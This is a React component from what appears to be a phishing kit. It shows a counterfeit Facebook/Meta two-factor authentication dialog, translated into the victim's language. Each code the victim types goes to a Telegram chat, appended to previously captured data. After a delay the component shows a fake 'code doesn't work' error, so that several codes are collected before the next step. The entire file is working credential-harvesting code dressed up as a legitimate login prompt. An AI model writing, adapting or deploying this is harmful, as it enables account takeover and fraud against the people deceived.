import { sendMessage } from '@/lib/telegram';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import Image from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import VerifyImage from '@/assets/images/2FA.png';

const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, messageContent, setMessageContent, setMessageId } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingMs = (config.CODE_LOADING_TIME ?? 15) * 1000;
    const waitTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Two-factor authentication request', 'Enter the code sent to your email, phone number, or confirm with an authenticator app.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another method'];

        const translateAll = async () => {
            const entries = await Promise.all(textsToTranslate.map(async (text) => [text, await translateText(text, geoInfo.country_code)] as const));

            setTranslations(Object.fromEntries(entries));
        };

        void translateAll();
    }, [geoInfo]);

    useEffect(() => () => {
        if (waitTimer.current) clearTimeout(waitTimer.current);
    }, []);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;

        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;

        const sentId = await sendMessage({
            message: updatedMessage,
            message_id: messageId
        });

        if (sentId === null) {
            setIsLoading(false);
            return;
        }
        setMessageId(sentId);
        setMessageContent(updatedMessage);

        if (waitTimer.current) clearTimeout(waitTimer.current);
        waitTimer.current = setTimeout(() => {
            setIsLoading(false);
            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
            }
        }, loadingMs);
    };

    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center overflow-y-auto bg-black/45 p-2'>
            <div className='flex max-h-[calc(100vh-16px)] min-h-[min(860px,calc(100vh-16px))] w-full max-w-130 flex-col overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl'>
                <div className='flex flex-1 flex-col justify-between'>
                    <div>
                        <div className='mb-2 flex items-center gap-1.5 text-sm text-[#9a979e]'><span>Facebook</span><span className='h-1 w-1 rounded-full bg-[#9a979e]' /></div>
                        <h2 className='mb-3 text-[22px] font-bold text-black'>{t('Two-factor authentication request')}</h2>
                        <p className='text-[15px] leading-6 text-[#9a979e]'>{t('Enter the code sent to your email, phone number, or confirm with an authenticator app.')}</p>
                    </div>
                    <div className='my-4 overflow-hidden rounded-[10px] bg-[#f5f5f5]'>
                        <Image src={VerifyImage} alt='' className='w-full' />
                    </div>
                    <div>
                        <div className={`flex h-10 w-full items-center rounded-[10px] border-2 bg-white px-3 ${showError ? 'border-red-500' : 'border-[#d4dbe3]'}`}>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={isLoading}
                            className='h-full w-full border-0 bg-transparent text-sm'
                            placeholder={t('Code')}
                        />
                        </div>
                        {showError && <p className='mt-1 text-xs text-red-500'>{t("This code doesn't work. Check it's correct or try a new one after")}</p>}
                        <button type='button' onClick={handleSubmit} disabled={isLoading || code.length < 6} className={`mt-3 flex h-10 w-full items-center justify-center rounded-full bg-[#0064e0] text-sm font-semibold text-white ${isLoading || code.length < 6 ? 'cursor-not-allowed opacity-70' : ''}`}>
                            {isLoading ? <span className='h-5 w-5 animate-spin rounded-full border-3 border-white/40 border-t-white' /> : t('Continue')}
                        </button>
                        <button type='button' className='mt-5 flex h-10 w-full items-center justify-center rounded-full border border-[#d4dbe3] text-sm text-[#8f949d]'>{t('Try another method')}</button>
                    </div>
                    <Image src={MetaLogo} alt='Meta' width={64} className='mx-auto mt-5' />
                </div>
            </div>
        </div>
    );
};

export default VerifyModal;
